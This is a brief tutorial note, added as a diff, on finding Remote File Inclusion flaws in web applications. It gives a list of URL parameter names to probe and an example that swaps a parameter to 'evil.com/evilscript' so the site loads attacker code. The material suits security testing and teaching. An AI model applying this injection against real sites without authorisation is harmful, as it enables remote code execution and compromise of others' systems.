@@ -1,0 +1,47 @@
+Remote File Inclusion 
+
+Sometimes the domains/web applications include files from other Remote domains/web servers/web applications , normally they do it by requesting that resource through the URL/URI.
+So the Remote File Inclusion vulnerability occurs when the user can change the address requested in the URl.
+For example if a web application is requesting resource A then the attacker will change it and make the web application to request for resource B, which can be anything a payload or something else malicious.
+for example - this is the original link-  https://example.com/path=https://sandust.com/img1
+
+and then the attacker changes it to
+https://example.com/path=https://evil.com/evilscript
+
+words in the Url to check
+dest
+redirect
+uri
+continue
+url
+window
+next
+data
+reference
+site
+html
+val
+validate
+domain
+callback
+return
+page
+feed
+host
+port
+to
+out
+view
+dir
+show
+navigation
+open
+
+How to find this Vulnerability ?
+
+1. Spider the web application and search for the above mentioned keywords in the urls
+2. Once you find any link with any of these keywords try changing the parameters given to them , to some other resource of the same type on any other domain/web server . etc
+3. if that page includes the file from the address given by the attacker/user then it is vulnerable to remote file inclusion .
+
+
+
